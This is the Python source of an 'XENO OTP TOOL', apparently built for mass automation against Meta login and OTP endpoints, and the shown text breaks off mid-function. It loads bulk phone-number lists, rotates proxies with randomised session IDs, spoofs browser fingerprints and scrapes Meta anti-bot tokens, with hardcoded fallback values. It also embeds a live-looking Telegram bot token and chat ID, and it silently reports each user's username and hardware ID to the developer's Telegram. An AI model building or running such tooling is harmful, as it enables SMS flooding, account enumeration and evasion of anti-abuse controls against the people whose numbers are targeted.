
# ========================================
# config.py
# ========================================
import os
import sys
if sys.platform == "win32":
    os.system("chcp 65001 > nul")

# Terminal colors - Gold/Orange Premium Theme
WHITE = "\033[1;97m"
GREEN = "\x1b[38;5;220m"        # Gold (primary accent)
RED = "\x1b[38;5;208m"          # Deep Orange (highlight)
CYAN = "\x1b[38;5;214m"         # Warm Amber (secondary)
YELLOW = "\x1b[38;5;228m"       # Bright Gold
BLUE = "\x1b[38;5;172m"         # Bronze
MAGENTA = "\x1b[38;5;216m"      # Peach/Salmon
ORANGE = "\x1b[38;5;202m"       # Vivid Orange
GOLD = "\x1b[38;5;220m"         # Gold
VIOLET = "\x1b[38;5;179m"       # Dark Gold
DIM = "\x1b[38;5;94m"           # Dim Brown (for subtle elements)
RESET = "\033[0m"

# UI elements - Premium Gold
EKL = f"{CYAN}:{WHITE}"
LINE = f"{CYAN}✦{'═'*47}✦"
opt_labels = [f"{GREEN}〔{RED}{str(i).zfill(2)}{GREEN}〕" for i in range(1, 12)]

def clear_logo():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"""{CYAN}
                    ✦ ═══════════════ ✦
{GREEN}   ██╗  ██╗███████╗███╗   ██╗ ██████╗ 
   ╚██╗██╔╝██╔════╝████╗  ██║██╔═══██╗
    ╚███╔╝ █████╗  ██╔██╗ ██║██║   ██║
    ██╔██╗ ██╔══╝  ██║╚██╗██║██║   ██║
   ██╔╝ ██╗███████╗██║ ╚████║╚██████╔╝
   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝{RED}  ⚡ V-1.4
{CYAN}                    ✦ ═══════════════ ✦
{LINE}
 {GREEN}〔{RED}◆{GREEN}〕 TOOL         {EKL} XENO OTP TOOL
 {GREEN}〔{RED}◆{GREEN}〕 DEVELOPER    {EKL} Samol Hasan
 {GREEN}〔{RED}◆{GREEN}〕 STATUS       {EKL} ✅ ACTIVE
{LINE}""")

# ========================================
# user_agents.py
# ========================================
import random

IOS_NEW_VERSIONS = [
    # iOS 18.x
    ('18_0', '605.1.15', '18.0', '22A3354'),
    ('18_0_1', '605.1.15', '18.0', '22A3370'),
    ('18_1', '605.1.15', '18.1', '22B83'),
    ('18_1_1', '605.1.15', '18.1', '22B91'),
    ('18_2', '605.1.15', '18.2', '22C152'),
    ('18_2_1', '605.1.15', '18.2', '22C161'),
    ('18_3', '605.1.15', '18.3', '22D60'),
    ('18_3_1', '605.1.15', '18.3', '22D63'),
    ('18_3_2', '605.1.15', '18.3', '22D82'),
    ('18_4', '605.1.15', '18.4', '22E240'),
    ('18_4_1', '605.1.15', '18.4', '22E252'),
    ('18_5', '605.1.15', '18.5', '22F76'),
]

def get_ios_new():
    ios_ver, webkit, safari_ver, build = random.choice(IOS_NEW_VERSIONS)
    return f'Mozilla/5.0 (iPhone; CPU iPhone OS {ios_ver} like Mac OS X) AppleWebKit/{webkit} (KHTML, like Gecko) Version/{safari_ver} Mobile/{build} Safari/{webkit.split(".")[0]}.1', 'iOS New'

import re
import time

# Pre-compiled regex patterns for token extraction
LSD_PATTERNS = [
    re.compile(r'"LSD",\[\],\{"token":"([^"]+)"\}'),
    re.compile(r'"lsd"\s*:\s*"([^"]+)"'),
    re.compile(r'name="lsd"\s+value="([^"]+)"'),
    re.compile(r'\["LSD",\[\],\{"token":"([^"]+)"\}'),
    re.compile(r'"token"\s*:\s*"([^"]+)"'),
]

REV_PATTERN = re.compile(r'"server_revision"\s*:\s*(\d+)')
HSI_PATTERN = re.compile(r'"hsi"\s*:\s*"(\d+)"')
SPIN_B_PATTERN = re.compile(r'"__spin_b"\s*:\s*"([^"]+)"')
SPIN_T_PATTERN = re.compile(r'"__spin_t"\s*:\s*(\d+)')

HS_PATTERNS = [
    re.compile(r'"haste_session"\s*:\s*"([^"]+)"'),
    re.compile(r'"__hs"\s*:\s*"([^"]+)"'),
]

COMET_REQ_PATTERN = re.compile(r'"__comet_req"\s*:\s*"?(\d+)"?')

FB_DTSG_PATTERNS = [
    re.compile(r'"DTSGInitialData",\[\],\{"token":"([^"]+)"\}'),
    re.compile(r'"dtsg"\s*:\s*\{"token"\s*:\s*"([^"]+)"\}'),
    re.compile(r'name="fb_dtsg"\s+value="([^"]+)"'),
    re.compile(r'"fb_dtsg"\s*:\s*"([^"]+)"'),
]

DYN_PATTERN = re.compile(r'"__dyn"\s*:\s*"([^"]+)"')
CSR_PATTERN = re.compile(r'"__csr"\s*:\s*"([^"]+)"')
HSDP_PATTERN = re.compile(r'"__hsdp"\s*:\s*"([^"]+)"')
HBLP_PATTERN = re.compile(r'"__hblp"\s*:\s*"([^"]+)"')
SJSP_PATTERN = re.compile(r'"__sjsp"\s*:\s*"([^"]+)"')

def extract_tokens(html, session_cookies=None, default_lsd="", default_rev="", default_hsi="",
                   default_hs="", default_spin_b="trunk", default_spin_t="", default_comet_req="72"):
    """Extract authentication tokens from Meta HTML response."""
    tokens = {}

    # LSD token
    lsd_val = default_lsd
    for p in LSD_PATTERNS:
        match = p.search(html)
        if match:
            lsd_val = match.group(1)
            break
    tokens['lsd'] = lsd_val

    # Server revision
    rev_match = REV_PATTERN.search(html)
    tokens['rev'] = rev_match.group(1) if rev_match else default_rev

    # HSI
    hsi_match = HSI_PATTERN.search(html)
    tokens['hsi'] = hsi_match.group(1) if hsi_match else default_hsi

    # Spin bundle
    spin_b_match = SPIN_B_PATTERN.search(html)
    tokens['spin_b'] = spin_b_match.group(1) if spin_b_match else default_spin_b

    # Spin timestamp
    spin_t_match = SPIN_T_PATTERN.search(html)
    tokens['spin_t'] = spin_t_match.group(1) if spin_t_match else (default_spin_t if default_spin_t else str(int(time.time())))

    # Haste session
    hs_val = default_hs
    for p in HS_PATTERNS:
        match = p.search(html)
        if match:
            hs_val = match.group(1)
            break
    tokens['hs'] = hs_val

    # Comet request ID
    comet_match = COMET_REQ_PATTERN.search(html)
    tokens['comet_req'] = comet_match.group(1) if comet_match else default_comet_req

    # DTSG token
    fb_dtsg = ""
    for p in FB_DTSG_PATTERNS:
        m = p.search(html)
        if m:
            fb_dtsg = m.group(1)
            break
    tokens['fb_dtsg'] = fb_dtsg

    # Dynamic Anti-bot tokens
    dyn_match = DYN_PATTERN.search(html)
    tokens['dyn'] = dyn_match.group(1) if dyn_match else "7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W099w8G1Dz81s8hwnU2lwv89k2C1Fwc60D82IzXwae4UaEW0Loco5G0zK1swa-0raazo7u0zE2ZwrU6C2q0XU6O1FwlU5G3y0zo7u0jW0eowRzE"
    
    csr_match = CSR_PATTERN.search(html)
    tokens['csr'] = csr_match.group(1) if csr_match else "gkeGqGmummSYICjPjsiF25AyWy8kAGWF38Kiiip4ypHKmim1irw6-w2Oo0J60tK0vslENa6xp1NxS5O2E0PS00mra0q-rc0uJ1id4w3480m9U1n808uoiglS1bw4do1a2z8do4i9oG22lx4yx91nw2MUf8eU5u"
    
    hsdp_match = HSDP_PATTERN.search(html)
    tokens['hsdp'] = hsdp_match.group(1) if hsdp_match else "gcRnf93M12AfEw3UDxadz88U0Km0BUbE07Je07w8"
    
    hblp_match = HBLP_PATTERN.search(html)
    tokens['hblp'] = hblp_match.group(1) if hblp_match else "09uUmwf-q6Uhwr86u4EScwzw2GpodoowvE0gBwcK02tK03cW0dixa07w81G83bKewro1No0gCw3t83wwnU0De0avw"
    
    sjsp_match = SJSP_PATTERN.search(html)
    tokens['sjsp'] = sjsp_match.group(1) if sjsp_match else "gcRnf948a0"

    # Jazoest (computed from cookies)
    if session_cookies:
        all_cookie_str = ''.join(session_cookies.get_dict().values())
        tokens['jazoest'] = "2" + str(sum(ord(c) for c in all_cookie_str))
    else:
        tokens['jazoest'] = ""

    return tokens

# ========================================
# proxy_manager.py
# ========================================
import json
import re
import random

DEFAULT_SETTINGS = {
    "api_settings": {
        "file_input_settings": {"always_use_txt": False, "use_multiple_excel_files": False},
        "proxy_settings": {"ask_for_proxy": False, "default_proxy": "2"},
        "user_agent_settings": {"ask_for_user_agent": False, "default_user_agent": "random"},
        "language_settings": {"ask_for_language": True, "default_language": "auto"},
        "otp_settings": {"ask_for_resend_count": True, "default_resend_count": 1},
        "thread_settings": {"ask_for_threads": True, "default_threads": 5}
    },
    "selenium_settings": {
        "file_input_settings": {"always_use_txt": False, "use_multiple_excel_files": False},
        "proxy_settings": {"ask_for_proxy": True, "default_proxy": ""},
        "user_agent_settings": {"ask_for_user_agent": False, "default_user_agent": "random"},
        "otp_settings": {"ask_for_resend_count": True, "default_resend_count": 1},
        "thread_settings": {"ask_for_threads": True, "default_threads": 5},
        "browser_settings": {"ask_for_browser": True, "default_browser": "chrome"},
        "headless_settings": {"ask_for_headless": True, "default_headless": False},
        "route_settings": {"ask_for_route": True, "default_route": 0},
        "work_mode": {"ask_for_mode": True, "default_mode": 0}
    }
}

def load_settings(setting_key="api_settings"):
    """Load and cache settings from internal DEFAULT_SETTINGS."""
    return DEFAULT_SETTINGS.get(setting_key, {})

def get_number_file_path():
    paths = ["numbers.txt", "Number_List.txt", "/sdcard/numbers.txt", "/sdcard/Download/numbers.txt", "/sdcard/Number_List.txt", "/sdcard/Download/Number_List.txt", "/storage/emulated/0/Download/numbers.txt", "/storage/emulated/0/Download/Number_List.txt"]
    # First pass: find a file that actually has content (not empty)
    for p in paths:
        if os.path.exists(p) and os.path.getsize(p) > 0:
            return p
    # Second pass: return first existing file (even if empty, for writing)
    for p in paths:
        if os.path.exists(p):
            return p
    return "Number_List.txt"

def get_proxy_file_path():
    paths = ["proxy.txt", "Proxy_List.txt", "/sdcard/proxy.txt", "/sdcard/Download/proxy.txt", "/sdcard/Proxy_List.txt", "/sdcard/Download/Proxy_List.txt", "/storage/emulated/0/Download/proxy.txt", "/storage/emulated/0/Download/Proxy_List.txt"]
    # First pass: find a file that actually has content (not empty)
    for p in paths:
        if os.path.exists(p) and os.path.getsize(p) > 0:
            return p
    # Second pass: return first existing file (even if empty, for writing)
    for p in paths:
        if os.path.exists(p):
            return p
    return "Proxy_List.txt"

def parse_proxy(proxy_str):
    """Parse a proxy string into requests-compatible dict format.
    
    Supported formats:
      - ip:port
      - ip:port:user:pass
      - user:pass:ip:port
      - user:pass@ip:port
      - ip:port@user:pass
      - http://user:pass@ip:port
    """
    import urllib.parse
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None

    if proxy_str.startswith("http://"):
        proxy_str = proxy_str[7:]
    elif proxy_str.startswith("https://"):
        proxy_str = proxy_str[8:]

    if "@" in proxy_str:
        part1, part2 = proxy_str.split("@", 1)
        part1_split = part1.split(":")
        part2_split = part2.split(":")
        
        # If part2 has port digits, it's host:port, meaning format is user:pass@host:port
        if len(part2_split) == 2 and part2_split[1].isdigit() and not (len(part1_split) == 2 and part1_split[1].isdigit() and ('.' in part1_split[0] or part1_split[0].isalpha())):
            user, pwd = part1_split[0], part1_split[1] if len(part1_split) > 1 else ""
            host, port = part2_split[0], part2_split[1]
        else:
            # It might be host:port@user:pass
            host, port = part1_split[0], part1_split[1] if len(part1_split) > 1 else ""
            user, pwd = part2_split[0], part2_split[1] if len(part2_split) > 1 else ""
            
        user = urllib.parse.quote(user)
        pwd = urllib.parse.quote(pwd)
        proxy_url = f"http://{user}:{pwd}@{host}:{port}"
    else:
        parts = proxy_str.split(':')
        if len(parts) == 4:
            if parts[1].isdigit() and not parts[3].isdigit():
                # ip:port:user:pass
                host, port, user, pwd = parts
            elif parts[3].isdigit() and not parts[1].isdigit():
                # user:pass:ip:port
                user, pwd, host, port = parts
            else:
                # Both are digits, check if parts[0] looks like IP or domain
                if '.' in parts[0] or parts[0].replace('.', '').isdigit():
                    host, port, user, pwd = parts
                else:
                    user, pwd, host, port = parts
                    
            user = urllib.parse.quote(user)
            pwd = urllib.parse.quote(pwd)
            proxy_url = f"http://{user}:{pwd}@{host}:{port}"
        elif len(parts) == 2:
            host, port = parts
            proxy_url = f"http://{host}:{port}"
        else:
            return None

    return {"http": proxy_url, "https": proxy_url}

def get_proxy_list(settings_key="api_settings", prompt_label="Proxy"):
    """Load proxies from settings and/or interactive user input."""
    settings = load_settings(settings_key)
    proxy_set = settings.get("proxy_settings", {})
    ask_proxy = proxy_set.get("ask_for_proxy", True)
    def_proxy = proxy_set.get("default_proxy", "")

    PROXY_LIST = []
    
    # 1. Try to load from Proxy_List.txt
    proxy_file = get_proxy_file_path()
    if os.path.exists(proxy_file):
        try:
            with open(proxy_file, "r") as f:
                lines = f.readlines()
            for idx, line in enumerate(lines):
                line = line.strip()
                if line and not line.startswith("#"):
                    original_line = line
                    # Auto-inject unique dynamic session ID for rotating backconnect proxies to ensure fresh IP per request
                    if "@" in line:
                        try:
                            host_port, user_pass = line.split("@", 1)
                            user_parts = user_pass.split(":")
                            if len(user_parts) == 2:
                                user, pwd = user_parts
                                if "session" in user.lower():
                                    user = re.sub(r'session-[a-zA-Z0-9]+', f'session-s{random.randint(100000, 999999)}', user)
                                else:
                                    user = f"{user}-session-s{random.randint(100000, 999999)}"
                                line = f"{host_port}@{user}:{pwd}"
                        except Exception:
                            pass
                    elif ":" in line:
                        parts = line.split(":")
                        if len(parts) == 4:
                            if "session" in parts[2].lower():
                                parts[2] = re.sub(r'session-[a-zA-Z0-9]+', f'session-s{random.randint(100000, 999999)}', parts[2])
                            else:
                                parts[2] = f"{parts[2]}-session-s{random.randint(100000, 999999)}"
                            line = ":".join(parts)
                    parsed = parse_proxy(line)
                    if parsed:
                        PROXY_LIST.append({'proxy': parsed, 'original': original_line})
        except Exception as e:
            print(f"{RED} Error reading {proxy_file}: {e}")

    # 2. If Proxy_List.txt is empty or doesn't exist, check Setting.json
    if not PROXY_LIST and def_proxy:
        if isinstance(def_proxy, list):
            for idx, p in enumerate(def_proxy):
                p_clean = p.strip()
                parsed = parse_proxy(p_clean)
                if parsed:
                    PROXY_LIST.append({'proxy': parsed, 'original': p_clean})
        else:
            p_clean = def_proxy.strip()
            parsed = parse_proxy(p_clean)
            if parsed:
                PROXY_LIST.append({'proxy': parsed, 'original': p_clean})

    # Test proxies connectivity concurrently (check ALL proxies for live/dead)
    verified_proxies = []
    if PROXY_LIST:

        print(f"\n{WHITE} Checking proxy connections (Ultra-Fast)...")
        from curl_cffi import requests
        from concurrent.futures import ThreadPoolExecutor

        def check_single_proxy(item):
            proxy_dict = item['proxy']
            proxy_str = item['original']
            try:
                country = "Unknown"
                match = re.search(r'[-_](?:region|country|zone)[-_]([a-zA-Z]{2})', proxy_str)
                if match:
                    country = match.group(1).upper()

                test_session = requests.Session(impersonate=random.choice(['chrome131', 'chrome133a', 'chrome136', 'chrome142', 'chrome145', 'chrome146']), proxies=proxy_dict)
                response = test_session.get("https://ipwho.is/", timeout=5)
                if response.status_code == 200:
                    if country == "Unknown":
                        try:
                            geo_data = response.json()
                            if geo_data.get("success"):
                                country = geo_data.get("country_code", "Unknown").upper()
                        except:
                            pass
                    return {'status': 'ok', 'item': item, 'proxy_str': proxy_str, 'country': country}
                else:
                    reason = "Auth Failed" if response.status_code in [403, 407] else "Failed"
                    return {'status': 'fail', 'proxy_str': proxy_str, 'reason': reason}
            except Exception as e:
                e_str = str(e).lower()
                reason = "Auth Failed" if "407" in e_str or "auth" in e_str else ("Timeout" if "timeout" in e_str else "Failed")
                return {'status': 'fail', 'proxy_str': proxy_str, 'reason': reason}

        # Check proxies with 200 parallel threads for instant response
        max_check_threads = min(len(PROXY_LIST), 200)
        with ThreadPoolExecutor(max_workers=max_check_threads) as executor:
            results = list(executor.map(check_single_proxy, PROXY_LIST))

        for res in results:
            if res['status'] == 'ok':
                verified_proxies.append({'proxy': res['item']['proxy'], 'locale': 'en_US', 'country': res['country']})
                print(f"{GREEN} [{RED}◆{GREEN}] Proxy OK [{res['country']}]: {res['proxy_str']}")
            else:
                print(f"{RED} [{RED}●{RED}] Proxy DEAD [{res.get('reason','?')}]: {res['proxy_str']}")

    if verified_proxies:
        print(f"{GREEN} [{RED}◆{GREEN}] Successfully loaded {len(verified_proxies)} active proxies.")
        return verified_proxies
    else:
        print(f"{YELLOW} No active proxies working. Proceeding with Real IP (direct connection).")
        return []

# ========================================
# file_reader.py
# ========================================
import os
import re
import csv
import json

# Secondary load_settings has been consolidated.
# DEFAULT_SETTINGS is defined earlier.

def load_settings(setting_key="api_settings"):
    return DEFAULT_SETTINGS.get(setting_key, {})

CLEAN_PATTERN = re.compile(r'[\s\-\(\)\.]')
PHONE_PATTERN = re.compile(r'^\+?\d{7,15}$')

def clean_and_validate(value):
    """Strip formatting characters and validate as phone number."""
    if not value:
        return None
    cleaned = CLEAN_PATTERN.sub('', str(value).strip())
    if PHONE_PATTERN.match(cleaned):
        return cleaned
    return None

def column_phone_score(col_values):
    """Score a column by how many values look like phone numbers (0.0 to 1.0)."""
    total = 0
    phone_count = 0
    for v in col_values:
        if v and str(v).strip():
            total += 1
            if clean_and_validate(v) is not None:
                phone_count += 1
    return phone_count / total if total > 0 else 0

def detect_and_extract_numbers(rows):
    """Auto-detect which column contains phone numbers and extract them."""
    if not rows:
        return []

    max_cols = max(len(row) for row in rows)
    if max_cols == 0:
        return []

    first_row = rows[0]
    has_header = len(rows) > 1 and not any((v and str(v).strip() and clean_and_validate(v)) for v in first_row)
    data_rows = rows[1:] if has_header else rows

    if not data_rows:
        return []

    # Sample up to 100 rows for column detection
    sample_size = min(len(data_rows), 100)
    sample_rows = data_rows[:sample_size]

    best_col = -1
    best_score = 0

    for col_idx in range(max_cols):
        col_values = (row[col_idx] if col_idx < len(row) else '' for row in sample_rows)
        score = column_phone_score(col_values)
        if score > best_score:
            best_score = score
            best_col = col_idx

    if best_col == -1 or best_score < 0.5:
        return []

    numbers = []
    for row in data_rows:
        if best_col < len(row):
            cleaned = clean_and_validate(row[best_col])
            if cleaned:
                numbers.append(cleaned)
    return numbers

def read_numbers_from_txt(file_path):
    """Read phone numbers from a plain text file (one per line)."""
    for enc in ['utf-8', 'utf-8-sig', 'cp1252', 'latin-1']:
        try:
            with open(file_path, 'r', encoding=enc) as f:
                lines = f.readlines()
            break
        except (UnicodeDecodeError, UnicodeError):
            continue
    else:
        return []

    numbers = []
    for line in lines:
        cleaned = clean_and_validate(line.strip())
        if cleaned:
            numbers.append(cleaned)
    return numbers

def read_numbers_from_csv(file_path):
    """Read phone numbers from a CSV file with auto column detection."""
    rows = []
    for enc in ['utf-8', 'utf-8-sig', 'cp1252', 'latin-1']:
        try:
            with open(file_path, 'r', encoding=enc, newline='') as f:
                rows = list(csv.reader(f))
            break
        except (UnicodeDecodeError, UnicodeError):
            continue

    if not rows:
        return []
    return detect_and_extract_numbers(rows)

def read_numbers_from_xlsx(file_path):
    """Read phone numbers from an Excel (.xlsx) file."""
    try:
        import openpyxl
    except ImportError:
        print(f"{RED} openpyxl not installed! Run: pip install openpyxl")
        return []

    try:
        wb = openpyxl.load_workbook(file_path, read_only=True, data_only=True)
        ws = wb.active
        rows = [[str(cell) if cell is not None else '' for cell in row] for row in ws.iter_rows(values_only=True)]
        wb.close()
    except Exception as e:
        print(f"{RED} Error reading Excel file: {e}")
        return []

    if not rows:
        return []
    return detect_and_extract_numbers(rows)

def read_numbers(file_path):
    """Read phone numbers from any supported file format (.txt, .csv, .xlsx)."""
    if not os.path.exists(file_path):
        return []

    ext = os.path.splitext(file_path)[1].lower()

    if ext == '.txt':
        return read_numbers_from_txt(file_path)
    elif ext == '.csv':
        return read_numbers_from_csv(file_path)
    elif ext == '.xlsx':
        return read_numbers_from_xlsx(file_path)
    else:
        return []


# Interactive file selection and number loading

def process_number_list_fallback():
    """Fallback: try to load numbers from Number_List.txt directly."""
    num_file = get_number_file_path()
    if os.path.exists(num_file):
        with open(num_file, "r", encoding="utf-8", errors="ignore") as f:
            numbers = [line.strip() for line in f if line.strip()]
        if numbers:
            print(f"{GREEN} [{RED}◆{GREEN}] Selected File {EKL} {num_file}")
            settings = load_settings("api_settings")
            if not settings.get("file_input_settings", {}).get("always_use_txt", False):
                input(f"{WHITE} Press Enter to Start Processing {len(numbers)} Numbers...")
            return numbers
        else:
            print(f"{WHITE} '{num_file}' file is empty.")
    else:
        print(f"{WHITE} '{num_file}' file was not found.")

    return None

def finalize_numbers(numbers, source_name):
    """Remove duplicates, save to Number_List.txt, and confirm with user."""
    num_file = get_number_file_path()
    if numbers:
        nums = list(dict.fromkeys(numbers))
        with open(num_file, "w", encoding="utf-8", errors="ignore") as f:
            for num in nums:
                f.write(num + "\n")

        print(f"{GREEN} [{RED}◆{GREEN}] Total Unique Numbers Extracted {EKL} {len(nums)}")
        if source_name != num_file and source_name != "Number_List.txt":
            print(f"{GREEN} [{RED}◆{GREEN}] Found from: {source_name}")
            print(f"{GREEN} [{RED}◆{GREEN}] Saved to '{num_file}'\n")

        settings = load_settings("api_settings")
        if not settings.get("file_input_settings", {}).get("always_use_txt", False):
            input(f"{WHITE} Press Enter to Start Processing {len(nums)} Numbers...")
        return nums
    return None

def file_input(setting_key="api_settings"):
    """Interactive file selection based on settings configuration."""
    settings = load_settings(setting_key)
    file_settings = settings.get("file_input_settings", {})
    always_use_txt = file_settings.get("always_use_txt", False)
    use_multiple_excel = file_settings.get("use_multiple_excel_files", False)

    # Mode 1: Always use Number_List.txt
    if always_use_txt:
        return process_number_list_fallback()

    # Mode 2: Batch process all Excel files in current directory
    if use_multiple_excel:
        xlsx_files = [f for f in os.listdir('.') if f.endswith(".xlsx") and not f.startswith("~$")]
        if xlsx_files:
            print(f"{GREEN} [{RED}◆{GREEN}] Found {len(xlsx_files)} Excel Files.")
            all_numbers = []
            for f in xlsx_files:
                print(f"{WHITE} Extracting from {EKL} {f}...")
                nums = read_numbers_from_xlsx(f)
                if nums:
                    all_numbers.extend(nums)
                    print(f"{GREEN}  -> Found {len(nums)} numbers.")
                else:
                    print(f"{RED}  -> Failed: No valid numbers found or error occurred.")

            if all_numbers:
                return finalize_numbers(all_numbers, f"{len(xlsx_files)} Excel files")
            else:
                print(f"{RED} No valid numbers found in any Excel files.")
                return process_number_list_fallback()
        else:
            print(f"{WHITE} No Excel files found.")
            return process_number_list_fallback()

    # Mode 3: Interactive file selection
    supported_ext = ('.txt', '.csv', '.xlsx')
    files = [f for f in os.listdir('.') if f.lower().endswith(supported_ext) and not f.startswith("~$")]

    if not files:
        print(f"{WHITE} No Supported files found.")
        return process_number_list_fallback()

    filename = None
    if len(files) == 1:
        filename = files[0]
    else:
        print(f"{GREEN} [{RED}◆{GREEN}] Found {len(files)} File(s):")
        for idx, f in enumerate(files, 1):
            print(f" {GREEN}[{RED}{idx}{GREEN}] {WHITE}{f}")
        print(f"{LINE}")

        while True:
            try:
                choice = input(f"{GREEN} [{RED}◆{GREEN}] Select File (1-{len(files)}) {EKL} ").strip()
                if choice.isdigit():
                    idx = int(choice) - 1
                    if 0 <= idx < len(files):
                        filename = files[idx]
                        break
                print(f"{RED} Invalid selection!")
            except:
                pass

    print(f"{GREEN} [{RED}◆{GREEN}] Selected File {EKL} {filename}\n")

    nums = read_numbers(filename)
    if nums:
        return finalize_numbers(nums, filename)
    else:
        print(f"{RED} Error: No valid phone numbers extracted from {filename}.")
        return process_number_list_fallback()

# ========================================
# shared_core.py
# ========================================
import os

import platform
import getpass
import datetime
import webbrowser
from curl_cffi import requests
import re

TELEGRAM_BOT_TOKEN = "8823775166:AAFZeLtovMfGEzEwXOcKh3HjMp5weLMyr78"
TELEGRAM_ADMIN_CHAT_ID = "6262468884"
# Replace this with your Rentry Raw Link (e.g. https://rentry.co/YOUR_SLUG/raw)
# Make sure the Rentry contains the same STATUS and HWID=DAYS format.
RENTRY_RAW_URL = "https://rentry.co/p69yq9z8/raw"


def get_hwid():
    import uuid
    import hashlib
    import subprocess
    import os
    username = getpass.getuser() or "user"
    
    # Fix for Termux: uuid.getnode() randomizes MAC on Android due to privacy restrictions
    if os.path.exists("/data/data/com.termux") or "com.termux" in os.environ.get("PREFIX", ""):
        try:
            mac_addr = subprocess.check_output("settings get secure android_id", shell=True, stderr=subprocess.DEVNULL).decode().strip()
            if not mac_addr:
                mac_addr = "termux_" + username
        except:
            mac_addr = "termux_" + username
    else:
        mac_addr = ""
        sys_platform = platform.system().lower()
        if sys_platform == "windows":
            try:
                # Use WMIC to get a hardware UUID that does not change with IP/network adapters
                output = subprocess.check_output("wmic csproduct get uuid", shell=True, stderr=subprocess.DEVNULL).decode().strip()
                lines = [line.strip() for line in output.split('\n') if line.strip()]
                if len(lines) > 1:
                    mac_addr = lines[1]
            except:
                pass
        
        # Fallback to uuid.getnode() if wmic fails or not on windows
        if not mac_addr:
            mac_addr = str(uuid.getnode())
        
    sys_platform = platform.system().lower()
    os_platform = "win32" if sys_platform == "windows" else ("darwin" if sys_platform == "darwin" else "linux")
    machine = platform.machine().lower()
    os_arch = "x64" if machine in ["amd64", "x86_64"] else machine
    hwid_str = f"{username}_{mac_addr}_{os_platform}_{os_arch}"
    return hashlib.md5(hwid_str.encode()).hexdigest().upper()[:16]

def verify_auth():
    hwid = get_hwid()
    print(f"\n{YELLOW}Checking License from Server...{WHITE}")
    
    try:
        import time
        # Fetching auth data from your KataBump Server
        katabump_url = "http://145.239.65.119:20218/auth.txt"
        
        # We append a timestamp to ensure it's completely live and never cached
        res = requests.get(f"{katabump_url}?t={int(time.time())}", timeout=5)
        
        if res.status_code == 200:
            data = res.text
        else:
            print(f"{RED}[!] Failed to connect to Auth Server (KataBump returned {res.status_code}).{WHITE}")
            sys.exit(1)
            
    except Exception as e:
        print(f"{RED}[!] Failed to connect to Auth Server. Error: {e}{WHITE}")
        sys.exit(1)
        
    status_match = re.search(r"STATUS\s*=\s*(ON|OFF)", data, re.IGNORECASE)
    if status_match and status_match.group(1).upper() == "OFF":
        print(f"\n{RED}[!] TOOL IS CURRENTLY DISABLED FOR MAINTENANCE.{WHITE}")
        sys.exit(1)
        
    hwid_match = re.search(rf"{hwid}\s*=\s*(\d+)", data, re.IGNORECASE)
    if not hwid_match:
        print(f"\n{RED}[!] AUTHORIZATION REQUIRED{WHITE}")
        print(f"{WHITE}Your HWID: {GREEN}{hwid}{WHITE}")
        print(f"{RED}This HWID is not registered in the database.{WHITE}")
        print(f"{CYAN}Redirecting to Admin's Telegram inbox...{WHITE}\n")
        time.sleep(2)
        webbrowser.open("https://t.me/Samol_Hasan")
        sys.exit(1)
        
    expiry_timestamp = int(hwid_match.group(1))
    current_time = int(time.time())
    
    # Handle old auth.txt formats for security
    if expiry_timestamp < 100000:
        print(f"\n{RED}[!] LICENSE FORMAT ERROR{WHITE}")
        print(f"{RED}The license format has been updated for security. Please ask the admin to re-add your HWID.{WHITE}\n")
        sys.exit(1)
        
    if current_time > expiry_timestamp:
        print(f"\n{RED}[!] LICENSE EXPIRED{WHITE}")
        print(f"{WHITE}Your HWID: {GREEN}{hwid}{WHITE}")
        print(f"{RED}Your license has expired. Please contact admin.{WHITE}\n")
        sys.exit(1)
        
    expiry_date = datetime.datetime.fromtimestamp(expiry_timestamp)
    expiry_date_str = expiry_date.strftime("%Y-%m-%d %H:%M")
    days_left = max(0, (expiry_timestamp - current_time) // 86400)
    
    # Clean up old vulnerable license.key file if it exists
    lic_path = "license.key"
    if os.path.exists(lic_path):
        try: os.remove(lic_path)
        except: pass

    print(f"{GREEN}[*] License Valid! Expires on: {expiry_date_str} (approx {days_left} Days left){WHITE}")
    
    try:
        msg = f"✅ *Successful Login*\n👤 *User:* `{getpass.getuser()}`\n🔑 *HWID:* `{hwid}`\n📅 *Expires:* {expiry_date_str}"
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", json={
            "chat_id": TELEGRAM_ADMIN_CHAT_ID,
            "text": msg,
            "parse_mode": "Markdown"
        }, timeout=3)
    except:
        pass
        
    time.sleep(1.5)

import sys
import time
import threading
import itertools
import random
import string


# Thread-safe locks
print_lock = threading.Lock()
counter_lock = threading.Lock()
file_lock = threading.Lock()

# Global counters
total_checked = 0
total_success = 0
total_failed = 0
total_error = 0
total_noacc = 0
total_nosms = 0
total_cap = 0
total_numbers = 0

def reset_counters():
    global total_checked, total_success, total_failed, total_error, total_noacc, total_nosms, total_cap, total_numbers
    total_checked = 0
    total_success = 0
    total_failed = 0
    total_error = 0
    total_noacc = 0
    total_nosms = 0
    total_cap = 0
    total_numbers = 0

def set_total_numbers(n):
    global total_numbers
    total_numbers = n


# UI helpers

def get_status_bar():
    pct = (total_checked / total_numbers * 100) if total_numbers > 0 else 0
    return f"\r{GREEN}  XENO ⮞ {WHITE}[{total_checked}/{total_numbers}] {pct:.1f}% {CYAN}⟫ {GREEN}OK: {total_success} {CYAN}⟫ {YELLOW}NoAcc: {total_noacc} {CYAN}⟫ {YELLOW}NoSMS: {total_nosms} {CYAN}⟫ {YELLOW}Cap: {total_cap} {CYAN}⟫ {RED}Err: {total_error}     "

def safe_print(text):
    """Thread-safe print that preserves the status bar at the bottom."""
    with print_lock:
        sys.stdout.write('\r' + ' ' * 80 + '\r')
        try:
            sys.stdout.write(str(text) + '\n')
        except UnicodeEncodeError:
            sys.stdout.write(str(text).encode('utf-8', errors='ignore').decode('utf-8') + '\n')
        sys.stdout.write(get_status_bar())
        sys.stdout.flush()

def update_counter(status, number=None, message=None, color=None):
    """Update global counters and optionally print a status message."""
    global total_checked, total_success, total_failed, total_error, total_noacc, total_nosms, total_cap
    with counter_lock:
        if status == "success":
            total_success += 1
        elif status == "failed":
            total_failed += 1
        elif status == "error":
            total_error += 1
        elif status == "noacc":
            total_noacc += 1
        elif status == "nosms":
            total_nosms += 1
        elif status == "cap":
            total_cap += 1
        total_checked += 1

    if message and number:
        if not color: color = WHITE
        safe_print(f"{color} {message} {number}")
    elif message:
        if not color: color = WHITE
        safe_print(f"{color} {message}")
    else:
